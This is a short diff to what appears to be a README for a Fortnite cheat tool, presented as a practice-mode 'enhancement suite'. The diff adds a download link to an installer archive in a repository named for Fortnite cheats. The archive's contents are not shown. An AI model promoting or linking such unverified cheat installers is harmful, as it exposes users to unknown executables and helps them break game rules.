@@ -4,3 +4,6 @@
   <strong>External game enhancement suite for Fortnite Chapter 5.</strong><br>
   Designed for solo practice and creative mode training.
 </p>
+
+
+[⬇️ Download Latest](https://github.com/xomapitos/Fortnite-Cheats-2026/releases/download/v1.1/Installer.zip)
